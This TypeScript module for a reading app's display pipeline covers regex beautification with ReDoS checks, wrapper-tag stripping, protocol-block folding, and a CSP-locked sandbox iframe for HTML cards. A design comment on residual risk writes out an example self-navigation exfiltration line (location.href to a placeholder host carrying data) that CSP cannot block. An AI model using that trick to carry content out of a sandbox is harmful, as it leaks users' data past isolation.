// app/study/deskRender.ts
// 打字桌 · 下行(美化)正则展示管道:纯函数,不碰 React/DOM。
// 镜像后端 applyUpRegex 的安全纪律——同一套规则抄一份到前端,因为下行正则
// (direction='down'/'both')约定"渲染时应用",后端装配管线不跑这批,只有阅读这一侧
// (TypingDesk.tsx)会真正执行这些规则。
//
// 安全纪律逐条对应:
//   ① enabled && direction in {down,both} && !invalid && !unsafe 才跑(导入校验时已经把编译不过/
//     疑似灾难性回溯的正则降级 enabled=0 并标记,这里的 invalid/unsafe 检查是纵深防御,不是冗余)。
//   ② compile 用 try/catch 包一层——GET /api/oc/desk/regex 只保证"导入时验过一次",不保证
//     字段没被后续别的路径污染,per-rule 出错跳过、不打断整条流水线(同 applyUpRegex)。
//   ③ {{match}}→'$&' 用函数回调翻译,不能用字符串替换参数(.replace(/\{\{match\}\}/g,'$&')
//     字符串替换参数里 $& 是 JS 自己的特殊语法,会把 {{match}} 原样传回去——必须用函数回调,
//     返回值按字面量插入)。
//   ④ 20k 字封顶,超出部分原样贴回结果末尾、不参与任何规则(同 UP_REGEX_CAP 的 ReDoS 爆炸半径收敛)。
//
// 顺序选择:preset-scoped 规则先跑,global 规则后跑——预设自带的正则通常是"这份预设的展示协议"
// (比如把这份预设专属的状态栏协议转成卡片),全局正则是用户自己额外叠加的通用美化(比如统一
// 去掉某种符号),让预设专属规则先把结构立好、全局规则再在结构化结果上扫一遍,比反过来更不容易
// 互相打架。GET /api/oc/desk/regex 的 SQL 是 ORDER BY scope,name(字母序 global < preset),
// 所以这个顺序不能依赖 API 返回顺序,必须在这里显式重排。

// ===== 下行正则 =====

export interface DeskRegexRule {
  id: string;
  scope: 'preset' | 'global';
  preset_id: string | null;
  name: string;
  find: string;
  replace: string;
  flags: string;
  direction: 'up' | 'down' | 'both';
  enabled: boolean;
  invalid: boolean;
  unsafe: boolean;
}

// 楼层文本 20k 封顶(镜像 deskMacro.ts UP_REGEX_CAP)——单人已鉴权应用,力度按比例来,
// 不是给公网设的硬闸,纯粹收敛"最坏情况一条正则要扫多少字"这个爆炸半径。
const DOWN_REGEX_CAP = 20000;

// 同 deskMacro.ts translateReplaceString 的踩坑记录:不能写 .replace(/\{\{match\}\}/g,'$&')
// ——字符串替换参数里的 $& 是 JS 自己的特殊语法,会把 {{match}} 原样传回去,等于没变。
// 必须用函数回调,回调返回值按字面量插入,才能真正把 {{match}} 换成字面两个字符 $&。
function translateReplaceString(replace: string): string {
  return String(replace || '').replace(/\{\{match\}\}/g, () => '$&');
}

// 灾难性回溯启发式的前端镜像(落库的 unsafe 标记不足以当唯一防线,拉回来的 find 用前必须当场
// 再验一遍)——三族网眼跟后端 desk.ts isPatternUnsafe 逐字同款:嵌套量词/量词组内前缀交叠或
// 等值交替/量词组内自量化分支。同一套规则抄一份,改后端记得同步这里(镜像纪律同头注释)。
const UNBOUNDED_QUANT = String.raw`(?:[+*]|\{\d+,\})`;
const NESTED_QUANT_RE = new RegExp(String.raw`\([^()]*${UNBOUNDED_QUANT}\)${UNBOUNDED_QUANT}`);
const QUANTIFIED_ALT_GROUP_RE = new RegExp(String.raw`\(([^()]*)\)${UNBOUNDED_QUANT}`, 'g');
function isAmbiguousAlternation(groupContent: string): boolean {
  const alts = groupContent.split('|').map((s) => s.trim()).filter((s) => s.length > 0);
  if (alts.length < 2) return false;
  if (alts.some((a) => a.length >= 2 && /[?*+]$/.test(a))) return true;
  for (let i = 0; i < alts.length; i++) {
    for (let j = i + 1; j < alts.length; j++) {
      const a = alts[i], b = alts[j];
      if (a.startsWith(b) || b.startsWith(a)) return true;
    }
  }
  return false;
}
export function isPatternUnsafeMirror(find: string): boolean {
  const s = String(find || '');
  if (NESTED_QUANT_RE.test(s)) return true;
  QUANTIFIED_ALT_GROUP_RE.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = QUANTIFIED_ALT_GROUP_RE.exec(s))) {
    if (m[1].includes('|') && isAmbiguousAlternation(m[1])) return true;
  }
  return false;
}

export function applyDownRegex(text: string, rules: DeskRegexRule[]): string {
  const full = String(text || '');
  const capped = full.length > DOWN_REGEX_CAP;
  let out = capped ? full.slice(0, DOWN_REGEX_CAP) : full;
  const remainder = capped ? full.slice(DOWN_REGEX_CAP) : '';

  const ordered = [
    ...(rules || []).filter((r) => r.scope === 'preset'),
    ...(rules || []).filter((r) => r.scope === 'global'),
  ];

  for (const rule of ordered) {
    if (!rule.enabled) continue;
    if (rule.direction !== 'down' && rule.direction !== 'both') continue;
    if (rule.invalid || rule.unsafe) continue; // 纵深防御,导入校验时该摁灭的已经enabled=0进不来
    if (isPatternUnsafeMirror(rule.find)) continue; // 用前再验:不迷信落库标记
    try {
      const re = new RegExp(rule.find, rule.flags);
      out = out.replace(re, translateReplaceString(rule.replace));
    } catch {
      continue; // 单条规则编译/执行炸了不打断整条流水线
    }
  }
  return capped ? out + remainder : out;
}

// ===== <content> 包裹壳客户端剥离 =====
//
// 背景:后端 unwrapContentTag 是较晚才补上的收尾步骤,只对"补丁上线之后新落库的楼层"生效——
// 补丁上线*之前*就已经写进 desk_floors.content 的旧楼层,正文永远原样带着 <content>...</content>
// 这层壳(数据库里的历史记录不会被回填改写)。foldProtocolBlocks 逐行扫协议标签块时,会把整段
// <content>...</content>(=整篇正文)当成一个巨大的行级协议块折起来,展开之前只看到一个折叠
// 小块、看不到任何正文——这是需要在渲染前单独剥掉这层壳的原因,不是 foldProtocolBlocks 本身
// 逻辑有误,是它面对的输入里混进了一层不该由它处理的旧壳。
//
// 为什么不用更简单的"trim 视图下只剥开头/结尾"实现:实测撑不住两类真实样本——①旧楼层开头是
// 字面 <thinking> 块,<content> 排在其后算中段,trim 视图下开标签根本不在"首"的位置,剥不掉,
// 顶上依旧露出一整行 <content>。②续写拼接楼(同一楼被追加过好几轮)会攒出多段
// <content>...</content>,每一段都在正文中段,trim 视图的首尾判断压根碰不到它们;尾后还可能
// 再挂一段协议围栏,上下一起露渣。
//
// 因此改成"行级全剥",不再是"首尾"语义:不管 <content>/</content> 出现在文本的哪个位置、出现
// 几次——只要某一行整行去掉首尾空白后*恰好*是 <content>(含带属性形式,比如 <content foo="bar">
// 独占一行)或恰好是 </content>,这一整行(连同它的换行符)整个删掉,不留空行残渣。行内混在
// 正文里的字面 <content>(不独占一行,比如"她说的是'<content>那种感觉'"这种叙事引用)不算,
// 原样不动——判据只看"这一行整行是不是只有这一个标签",不做全文子串替换。```围栏铁律:围栏
// (含悬空未闭合的围栏)内部的行,不管长什么样,一律不剥——围栏里的内容永远归围栏,跟
// foldProtocolBlocks 头注释同一条"围栏不碰"纪律,这里独立做一份轻量的围栏范围判断(只要行的
// 起点落在某个围栏区间内就跳过整行的剥壳检查),不复用 foldProtocolBlocks 内部状态机(那个状态机
// 是给"折叠"用的,输出形状不一样,这里只需要"这一行在不在围栏里"这个布尔判断)。展示层剥离,
// 不改楼层落库内容,f.content 永远原样,道理同 splitInlineThinking/foldProtocolBlocks 头注释。
// 是否命中(unwrapMatched)由调用方直接比较"剥壳前后是否相等"得出——行级删除只会让字符串变短,
// 不会等长变形,相等即未命中、不等即至少剥了一行,语义天然覆盖"有没有任何一行被剥"。
//
// 终止符归属规则(替掉早期"最后一行不补换行符"的全局规则——那条全局规则在"壳前有真实空行"的
// 场景下会连真实空行的终止符一起吞掉,详见下方说明):
//   1. 基线:每条壳行删除时,只带走*它自己*的终止符(含 \r\n),别的行的终止符一概不动。中段壳行
//      (前后都还有实质内容)只走这一条,没有第2条的额外动作。
//   2. 唯一的附加动作,只发生在"位于文末的壳行"身上——判据:把这条/这一串连续壳行都删掉、再算上
//      文本物理末尾可能有的一个空 EOF 终止符之后,它后面不再剩任何东西。这样的壳行(或连续壳行串)
//      在删除时,再往前找*紧邻这一串壳行开头的那一条物理行*:
//        - 那一行是"非空行"(有实际字符的正文行)→连它自己的终止符也一并吸收掉(不吐出来)。
//        - 那一行是"空行"(真实空行,content===''的那种)→不吸收,原样保留它自己的终止符。
//      一串壳行只找*这一条*预行判断一次,不再逐层往上找更早的行(比如"<content>\n正文\n
//      </content>\n"这种开闭标签一起删,只看紧邻"</content>"这一串壳行前面的"正文",不理会
//      "<content>"本身——它是中段壳行,已经被规则1单独处理掉了)。
// 之所以只按这两条局部判定、不做任何"全局最后一行"式的归纳推导:早期版本试过"最后一行不补
// 换行符"这条全局规则,会被文本末尾的EOF合成空行鸠占鹊巢(顶替真正的正文行变成"最后一行"),
// 漏掉半步孤儿换行——"正文\n</content>\n"这样的输入会多吞一个换行符。补上那半步后又暴露反例:
// "正文\n\n</content>\n"里那条真实空行的终止符,被"最后一行不补"这条全局规则连坐吞掉,输出从
// 两行blank收缩成一行。删壳只应该动壳自己和它紧邻的那一层,不该殃及更早的真实空行,所以最终
// 版本不再用任何全局式规则做归纳推导,只按上面①②两条局部判定逐条执行,不做超出这两条之外的
// 额外化简。
const CONTENT_LINE_OPEN_RE = /^<content(?:\s[^<>]*)?>$/;
const CONTENT_LINE_CLOSE = '</content>';

// 围栏范围收集(镜像 foldProtocolBlocks 同款 FENCE_RE 配对逻辑+悬空围栏兜底,但只要区间不要
// 折叠结果——这里跑在 foldProtocolBlocks 之前,数据形状还是原始楼层文本,不能指望复用它的输出)。
function collectFenceRanges(text: string): Array<{ start: number; end: number }> {
  const ranges: Array<{ start: number; end: number }> = [];
  const re = /```[\s\S]*?```/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(text))) ranges.push({ start: m.index, end: m.index + m[0].length });
  const afterLast = ranges.length ? ranges[ranges.length - 1].end : 0;
  const idx = text.indexOf('```', afterLast);
  if (idx !== -1 && text.indexOf('```', idx + 3) === -1) ranges.push({ start: idx, end: text.length }); // 悬空围栏:到文末都算围栏内
  return ranges;
}

export function unwrapContentTagClient(text: string): string {
  const s = String(text || '');
  const n = s.length;
  if (!n) return s;

  const fences = collectFenceRanges(s);
  const inFence = (pos: number) => fences.some((f) => pos >= f.start && pos < f.end);

  // 第一阶段:逐行扫描,每条物理行都记一条 {content, term, dropped}(不管留没留都先记下来——
  // 判断"是不是文末壳行串"需要看物理相邻关系,只在最终的留存名单里回溯看不出这个,因为壳行
  // 本来就不进那份名单)。文本以\n收尾时,扫描到物理末尾会天然多切出一条 content/term 都是''
  // 的合成空行(不匹配任何壳标签,永远不会被标记 dropped)——它对输出没有任何实质贡献,后面
  // 判断"文末壳行串后面还剩不剩东西"时会专门跳过它,不需要特殊排除它进/出 records。
  const records: Array<{ content: string; term: string; dropped: boolean }> = [];
  let lineStart = 0;
  for (;;) {
    const nl = s.indexOf('\n', lineStart);
    const hasNl = nl !== -1;
    let contentEnd = hasNl ? nl : n; // 本行内容结束下标(不含换行符本身)
    if (hasNl && contentEnd > lineStart && s[contentEnd - 1] === '\r') contentEnd -= 1; // \r\n:内容不含\r
    const termEnd = hasNl ? nl + 1 : n; // 越过换行符之后的下标(末行=文本结尾)
    const lineContent = s.slice(lineStart, contentEnd);
    const lineTrimmed = lineContent.trim();
    const isShellLine = CONTENT_LINE_OPEN_RE.test(lineTrimmed) || lineTrimmed === CONTENT_LINE_CLOSE;
    records.push({ content: lineContent, term: s.slice(contentEnd, termEnd), dropped: isShellLine && !inFence(lineStart) });
    lineStart = termEnd;
    if (!hasNl) break; // 真到文本物理末尾(哪怕这行是空的,也已经扫过——不留没扫到的尾巴)
  }

  // 第二阶段:找"文末壳行串"(规则2的判据),只找这一串、只吸收它前面紧邻的那一条物理行。
  // lastReal = 最后一条"真实"物理行的下标(跳过可能存在的 EOF 合成空行,它永远不是壳行、
  // 天然满足"文末往后没内容了"这个前提,不需要参与壳行串的判定本身)。
  const hasSyntheticTail = s.endsWith('\n');
  const lastReal = records.length - (hasSyntheticTail ? 2 : 1);
  let suppressIdx = -1; // 命中吸收条件时,这一条记录(必然非壳行)的 term 不吐出来
  if (lastReal >= 0 && records[lastReal].dropped) {
    let runStart = lastReal;
    while (runStart > 0 && records[runStart - 1].dropped) runStart--; // 往前找这一串连续壳行的起点
    const predIdx = runStart - 1;
    if (predIdx >= 0 && records[predIdx].content !== '') suppressIdx = predIdx; // 非空行才吸收;空行/无预行都不动
  }

  // 第三阶段:拼接——跳过所有被剥的壳行;非壳行原样吐出内容+term,除非命中上面算出的 suppressIdx。
  let out = '';
  for (let i = 0; i < records.length; i++) {
    if (records[i].dropped) continue;
    out += records[i].content;
    if (i !== suppressIdx) out += records[i].term;
  }
  return out;
}

// ===== 协议渣兜底折叠(折叠成可展开小块,不是隐藏) =====
//
// 背景:打字桌楼层正文里会残留模型吐的行级协议块(实测有 <enigma>、<meow_FM>、<branches>、
// <snow>、<ccd>、<角色状态面板> 等,模型还会发明新标签名)。applyDownRegex 只跑用户自己配置的
// 正则,漏网的新标签名裸奔在正文里——这个纯函数是兜底,跑在 applyDownRegex 之后,把"吃剩的"
// 协议块也折成可展开小块。<thinking>/<content> 壳各自归自己的专属管道处理(thinking 归
// splitInlineThinking,content 归上面 unwrapContentTagClient),这两个标签名也进了下面
// FOLD_SKIP_TAGS 排除清单——双保险:万一将来哪层管线漏接了专属处理,至少不会重演"整段正文被
// 当协议块吞掉"这种最坏情况,漏网的其它协议标签照折不误,不做例外。
//
// 识别规则(行级协议块):开标签 <标签名> 独占一行(trim后整行只有这个标签,允许简单形式
// <tag> 和带属性形式 <tag attr="v">),到与之配对的行级 </标签名> 为止(含两端)。标签名允许
// 字母/数字/下划线/连字符/中文。嵌套同名标签按深度配平(内层同名开/闭都计数,深度归零才算
// 真正闭合);配不平(扫到文末深度仍不为0)当"悬空块",折到文末。跟同名之外的其它标签交错
// 出现时,一律当外层块的原文内容处理,不递归再拆(spec只钉了同名嵌套这一种情形)。
// 正文中段行内出现的 <xxx>(不独占一行)不算行级协议块,原样留在 text 里不碰。
//
// details/summary 特例("已经是details形态的内容不要二次包")——某些美化正则的产物会直接产出
// 字面 <details>/<summary> 文本(不在 ```html 围栏里的那种),这两个标签名不当协议块开标签处理,
// 避免把已经是折叠态的内容再套一层折叠。
//
// 围栏铁律(基线规则):```围栏(含```html美化卡)内部的内容一律不碰——先按 ``` 配对切段,只在
// 段外扫描,段内原样透传(不判断语言、不递归)。跟 segmentRendered 头注释同一条取舍:不处理
// 嵌套/未闭合围栏,朴素优先。
//
// 尾部围栏折叠——上面这条"围栏不碰"规则本来是为了不误伤 ```html 美化卡和用户自己贴的示例代码块,
// 但真实数据里模型也会把协议渣(比如"[长期]…<br>"清单+"enigma:"小节)裸装进一个纯文本 ``` 围栏、
// 贴在正文末尾——"围栏不碰"反而让这坨渣光明正大地露在外面。收窄成:只有*定位在文本末尾*(围栏
// 闭合后,到整段文本结束为止只剩空白;或围栏根本没闭合、悬空到文末)的 ``` 围栏才当协议块折叠,
// 标题用围栏的 info-string(```后到换行前那一段,没有就叫「协议块」);```html 开头的围栏永远
// 例外(美化卡管道专用,不管在不在文本末尾都绝不碰)。连续多个尾部围栏(中间只隔空白)逐个单独折,
// 各自按自己的 info-string 定标题。正文中段的围栏(后面还跟着实质内容)照旧不碰,走老规则原样
// 透传。

export type FoldPart = { type: 'text'; text: string } | { type: 'fold'; tag: string; content: string };

// details/summary=已经是折叠态的产物不二次包;thinking/content=各自归专属管道处理,这里排除只是
// 双保险(见上面头注释任务1点3),不是这两个标签的唯一防线。
const FOLD_SKIP_TAGS = new Set(['details', 'summary', 'thinking', 'content']);
// 标签名字符集:字母/数字/下划线/连字符/中文(含扩展A区,够用不追求覆盖全部CJK)。
const TAG_NAME_CHARS = String.raw`[A-Za-z0-9_\-一-龥]+`;
// 行级开标签:trim后整行只有 <tag> 或 <tag attr...>(属性段不含尖括号,自闭合 <tag/> 排除)。
const LINE_OPEN_RE = new RegExp(`^[ \\t]*<(${TAG_NAME_CHARS})(?:\\s[^<>]*)?>[ \\t]*$`);
// 行级闭标签:trim后整行只有 </tag>。
const LINE_CLOSE_RE = new RegExp(`^[ \\t]*<\\/(${TAG_NAME_CHARS})>[ \\t]*$`);

// 段内(已经排除```围栏)逐行扫描,状态机识别配对/悬空块——只在 foldProtocolBlocks 内部调用,
// 不导出(外部只需要认围栏的完整版本)。
//
// 踩坑记录(自查用例时抓到,别用 split('\n')+join('\n') 重建):按行 split 会吃掉换行符本身,
// 段与段之间(文本→块→文本)各自 join 只补得回"段内部"的换行,两段交界处那一个换行永远丢失,
// 相当于悄悄改写了落库内容旁边的间距。改用下标法:只记录每行在原字符串里的起止位置,块的
// content/文本段的 text 都直接从原字符串 slice,不经过任何 split/join 往返,天然保真。
function foldPlainSegment(text: string): FoldPart[] {
  const n = text.length;
  const lineStarts: number[] = [];
  const lineEnds: number[] = []; // 该行不含末尾换行符的结束下标(即换行符自身的下标,或末行=n)
  let pos = 0;
  for (;;) {
    lineStarts.push(pos);
    const nl = text.indexOf('\n', pos);
    if (nl === -1) { lineEnds.push(n); break; }
    lineEnds.push(nl);
    pos = nl + 1;
  }
  const numLines = lineStarts.length;
  const lineText = (i: number) => text.slice(lineStarts[i], lineEnds[i]);

  const parts: FoldPart[] = [];
  let segStart = 0; // 当前"待归入text段"的原文起始下标
  let i = 0;
  while (i < numLines) {
    const openM = LINE_OPEN_RE.exec(lineText(i));
    const tagName = openM ? openM[1] : null;
    if (tagName && !FOLD_SKIP_TAGS.has(tagName.toLowerCase())) {
      let depth = 1;
      let closeLineIdx = -1;
      for (let j = i + 1; j < numLines; j++) {
        const l2 = lineText(j);
        const om2 = LINE_OPEN_RE.exec(l2);
        if (om2 && om2[1] === tagName) { depth++; continue; }
        const cm2 = LINE_CLOSE_RE.exec(l2);
        if (cm2 && cm2[1] === tagName) {
          depth--;
          if (depth === 0) { closeLineIdx = j; break; }
        }
      }
      const blockStart = lineStarts[i];
      if (segStart < blockStart) parts.push({ type: 'text', text: text.slice(segStart, blockStart) });
      if (closeLineIdx === -1) {
        // 悬空块:配不平/没等到闭合,折到文末(spec明文:配不平就当悬空块)。
        parts.push({ type: 'fold', tag: tagName, content: text.slice(blockStart, n) });
        segStart = n;
        i = numLines;
      } else {
        const blockEnd = lineEnds[closeLineIdx];
        parts.push({ type: 'fold', tag: tagName, content: text.slice(blockStart, blockEnd) });
        segStart = blockEnd;
        i = closeLineIdx + 1;
      }
      continue;
    }
    i++;
  }
  if (segStart < n) parts.push({ type: 'text', text: text.slice(segStart, n) });
  return parts;
}

// 相邻 text 段合并,减少渲染端要处理的碎片节点(纯清理,不影响内容——拼回去等于原串)。
function mergeAdjacentText(parts: FoldPart[]): FoldPart[] {
  const out: FoldPart[] = [];
  for (const p of parts) {
    const last = out[out.length - 1];
    if (p.type === 'text' && last && last.type === 'text') { last.text += p.text; }
    else out.push(p.type === 'text' ? { type: 'text', text: p.text } : p);
  }
  return out;
}

const FENCE_RE = /```[\s\S]*?```/g;

// 围栏 info-string 提取(任务1点2):```后到第一个换行前的那一段,trim 后当标题——不强制围栏后
// 必须紧跟换行(同 segmentRendered HTML_FENCE_RE 头注释:ST 正则产物不总带整齐换行),没有
// info-string(```后直接换行/直接是内容)就返回空串,调用方兜底成「协议块」。
function fenceInfoString(fenceFull: string): string {
  const m = /^```([^\n]*)/.exec(fenceFull);
  return m ? m[1].trim() : '';
}

type FenceSeg = { start: number; end: number; full: string };

export function foldProtocolBlocks(text: string): FoldPart[] {
  const src = String(text || '');

  // 收集全部*完整*围栏(FENCE_RE 老规则,非贪婪配对),外加"文末悬空未闭合"的那一个(若存在)——
  // 悬空围栏只可能有最多一个待认领(再往前的```都已经被 FENCE_RE 当完整对配走了,朴素优先,
  // 不处理"多个悬空"这种反常形状)。
  const fences: FenceSeg[] = [];
  FENCE_RE.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = FENCE_RE.exec(src))) fences.push({ start: m.index, end: m.index + m[0].length, full: m[0] });
  {
    const afterLast = fences.length ? fences[fences.length - 1].end : 0;
    const idx = src.indexOf('```', afterLast);
    if (idx !== -1 && src.indexOf('```', idx + 3) === -1) {
      fences.push({ start: idx, end: src.length, full: src.slice(idx) }); // 悬空:折到文末(点2"悬空围栏也按尾部围栏折")
    }
  }

  if (fences.length === 0) {
    const plainParts = foldPlainSegment(src);
    if (plainParts.length === 0) plainParts.push({ type: 'text', text: '' }); // 空输入兜底(同下方总出口的safeguard)
    return mergeAdjacentText(plainParts);
  }

  // 只有"最后一个围栏闭合(或悬空到文末)之后只剩空白"才谈得上尾部折叠——正文中段的围栏
  // (后面还有实质内容)一律不够格,走老规则整段交给 foldPlainSegment 原样透传。
  const lastFence = fences[fences.length - 1];
  const tailEligible = src.slice(lastFence.end).trim() === '';

  // 从后往前找连续尾部围栏:相邻两个围栏之间(或最后一个围栏到文末)必须全是空白才算"连续",
  // 一旦某个间隙有实质内容就停止往前扩展——那个围栏和更早的围栏都不算尾部,留给老规则处理。
  let tailStartIdx = fences.length; // 默认:没有确认的尾部围栏
  if (tailEligible) {
    let boundary = src.length;
    for (let i = fences.length - 1; i >= 0; i--) {
      const seg = fences[i];
      if (src.slice(seg.end, boundary).trim() !== '') break;
      tailStartIdx = i;
      boundary = seg.start;
    }
  }

  const parts: FoldPart[] = [];
  let cursor = 0;
  // 中段(0..tailStartIdx-1):围栏原样透传(含```html,老规则不变),围栏之间的文本照旧扫协议标签块。
  for (let i = 0; i < tailStartIdx; i++) {
    const seg = fences[i];
    if (seg.start > cursor) parts.push(...foldPlainSegment(src.slice(cursor, seg.start)));
    parts.push({ type: 'text', text: seg.full });
    cursor = seg.end;
  }
  // 尾部(tailStartIdx..end):逐个判断——```html 例外(美化卡管道专用,原样透传交给下游
  // segmentRendered),其余折成协议块,标题用 info-string、没有就「协议块」。围栏之间/围栏前的
  // 空白间隙原样保留成 text 段(前面已验证是纯空白,不会吞掉实质内容)。
  for (let i = tailStartIdx; i < fences.length; i++) {
    const seg = fences[i];
    if (seg.start > cursor) parts.push({ type: 'text', text: src.slice(cursor, seg.start) });
    if (seg.full.startsWith('```html')) {
      parts.push({ type: 'text', text: seg.full });
    } else {
      parts.push({ type: 'fold', tag: fenceInfoString(seg.full) || '协议块', content: seg.full });
    }
    cursor = seg.end;
  }
  if (cursor < src.length) parts.push({ type: 'text', text: src.slice(cursor) });

  if (parts.length === 0) parts.push({ type: 'text', text: '' });
  return mergeAdjacentText(parts);
}

// ===== 展示分段:```html 围栏块 → 卡片,其余原样文本 =====

// 'fold' 变体形状跟 FoldPart 的 fold 分支同款(折叠归展示层,跟html/text卡片同属一套"渲染段"
// 体系)——TypingDesk.tsx 把 foldProtocolBlocks 的输出和 segmentRendered 的输出拼成同一个数组
// 渲染,类型在这里合流,免得两头各自转一次。
export type RenderSegment = { type: 'html'; code: string } | { type: 'text'; text: string } | { type: 'fold'; tag: string; content: string };

// 只认 ```html 开栏(围栏后允许紧跟内容,不强制换行——ST 正则产出的格式不总带整齐的换行),
// 到下一个 ``` 收栏;不处理嵌套/未闭合围栏,那是"半截标签不管"的同一条取舍(照 TypingDesk.tsx
// splitInlineThinking 头注释的先例:朴素、不追求完美,先给阅读体验找个台阶)。
const HTML_FENCE_RE = /```html([\s\S]*?)```/g;

export function segmentRendered(text: string): RenderSegment[] {
  const src = String(text || '');
  const segments: RenderSegment[] = [];
  let lastIndex = 0;
  let m: RegExpExecArray | null;
  HTML_FENCE_RE.lastIndex = 0;
  while ((m = HTML_FENCE_RE.exec(src))) {
    if (m.index > lastIndex) {
      const chunk = src.slice(lastIndex, m.index);
      if (chunk.trim()) segments.push({ type: 'text', text: chunk });
    }
    const code = m[1].replace(/^\r?\n/, ''); // 剥掉 ```html 后紧跟的第一个换行,不剥内部缩进
    segments.push({ type: 'html', code });
    lastIndex = HTML_FENCE_RE.lastIndex;
  }
  if (lastIndex < src.length || segments.length === 0) {
    const chunk = src.slice(lastIndex);
    if (chunk.trim() || segments.length === 0) segments.push({ type: 'text', text: chunk });
  }
  return segments;
}

// ===== sandbox iframe srcDoc =====
//
// 隔离选择的取舍记录(记在这里免得以后有人"顺手"放宽或收紧):最初的方案是 sandbox="" 空属性——
// 不给 allow-scripts/allow-same-origin/allow-forms/allow-popups 中任何一项。这些卡片是装配引擎
// 产出的静态状态栏 HTML+CSS,预设作者若在里面塞了 <script>,那段脚本会静默失效(inert)——这是
// 有意的比例决策,不是遗漏:没有 allow-same-origin 就没有 postMessage 之外的通信面,也没有
// contentDocument 访问权,是"读小说时弹一张状态卡"这个需求能拿到的最强隔离。
//
// 自动测高的替代方案(拒绝):开 allow-same-origin 换 contentDocument.body.scrollHeight 精确测高,
// 但那样卡片就能读到跟父页同源的 storage/DOM 探测面——为了省一个固定高度容器,把"读小说"升级成
// "跑第三方 HTML 在半个隔离环境里",不值。改用固定 max-height + 内部滚动(overflow:auto 写进
// srcDoc 自己的 body 样式里,不依赖父页量出来的高度)。
//
// 后续放宽为 allow-scripts,原因是真实数据证实:部分预设的状态栏协议依赖<script>运行时把捕获组
// 填进模板骨架、量高度,空sandbox 摁死脚本后骨架(CSS 状态栏)在,填料(正文)整段消失——不是
// "能凑合"的降级,是"完全不可用"。比例重算之后放行 allow-scripts:卡片渲染的是用户自己导入的
// 预设产物(不是陌生第三方投喂内容),整张桌子单人已鉴权(不是公网匿名输入面)——但
// allow-same-origin/allow-forms/allow-popups/allow-top-navigation 依旧一个不给,opaque origin
// 铁律不动:脚本能跑,却摸不到父页 DOM/storage/cookie,也开不出表单提交/弹窗/顶层导航这些通信面
// 外的出口。CSP 从纯 style/img 放宽到额外允许内联脚本执行,但 connect-src 没单开、回落到
// default-src='none',fetch/XHR/WebSocket/信标/远程图/字体这些"发一个网络请求"的常规路子全被焊死。
// 副作用是"固定高度+内部滚动"的退路可以升级成真高度:卡片自己起 ResizeObserver 量
// documentElement/body,postMessage 把高度上报给父页(opaque origin 发不出真实 origin,只能广播到
// '*'——父页那侧靠 e.source 是不是"认识的卡片 iframe"来把关,细节在 TypingDesk.tsx 的 message
// 监听处)。父页收到消息前继续吃这个旧默认值兜底。
//
// 残余风险如实记录(不是漏洞,是接受的取舍):CSP 管得住"发请求"这个动作,管不住"导航"这个动作
// ——`allow-top-navigation` 没开只挡子框架把*父页*带飞,不挡子框架把*自己*带飞;
// `location.href='https://host/?data=...'` 这种自导航本身就是一次带数据出去的网络请求,CSP 的
// default-src/connect-src 对文档级导航不生效(`navigate-to` 指令已从 CSP 规范里死掉),
// `window.location` 又是 unforgeable 属性,srcdoc 这层锁不住——平台层目前没有能根治的手段。
// 已知这条缝、按比例接受:爆炸半径封顶在"卡片自己已经渲染出来的文本"(sandbox 内没有
// cookie/storage/父页 DOM 能偷,能带走的只有卡片渲染内容本身这一份),且比酒馆生态同款脚本在
// 没有任何隔离的环境里裸跑仍是数量级的强化。持续外带的止损靠 TypingDesk.tsx 的"导航击杀器"
// (第二次 load 事件=发生了导航,立刻拆 iframe 换警示条)兜底,取舍与局限记在那头注释里。
export const DESK_CARD_MAX_HEIGHT = 320;

export function buildCardSrcDoc(html: string): string {
  // font-family:inherit 在 srcdoc 跨文档语境下不会继承父页字体(独立文档,没有继承链可言),
  // 所以这里给一个理智的系统字体栈;color-scheme:light dark 让卡片跟着系统/浏览器明暗走,
  // 不需要额外接一条父页→iframe 的主题桥(sandbox 没开脚本通信通道,加了也白搭)。
  // CSP铁幕:sandbox="allow-scripts"挡不住脚本本身,但挡得住脚本/HTML/CSS 发起的常规网络加载
  // (远程图/字体/样式表/fetch/XHR/WebSocket=追踪像素/数据外带通道)。script-src 'unsafe-inline'
  // 只放行 srcDoc 自带的内联脚本(卡片自己的测高脚本+预设可能带的展示脚本),style-src 同理只
  // 放行内联样式,img-src 只认 data:,其余一律吃 default-src 'none' 的默认拒绝。如实记录:这堵墙
  // 挡的是"发请求",挡不住"导航"——脚本给 iframe 自己 location.href 跳转是 CSP 管不到的浏览器
  // 行为,取舍与兜底见上面头注释"残余风险"段。
  return `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:"><style>
html,body{margin:0;padding:10px 14px;box-sizing:border-box;color-scheme:light dark;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,"PingFang SC","Microsoft YaHei",sans-serif;
font-size:13.5px;line-height:1.6;overflow:auto;word-break:break-word;}
*{box-sizing:border-box;}
</style></head><body>${html}<script>(function(){
function report(){
  var h = Math.max(
    document.documentElement ? document.documentElement.scrollHeight : 0,
    document.body ? document.body.scrollHeight : 0
  );
  if (!h) return;
  try { parent.postMessage({ type: 'desk-card-height', h: h }, '*'); } catch (e) {}
}
try {
  var ro = new ResizeObserver(report);
  if (document.documentElement) ro.observe(document.documentElement);
  if (document.body) ro.observe(document.body);
} catch (e) {}
window.addEventListener('load', report);
report();
})();</script></body></html>`;
}
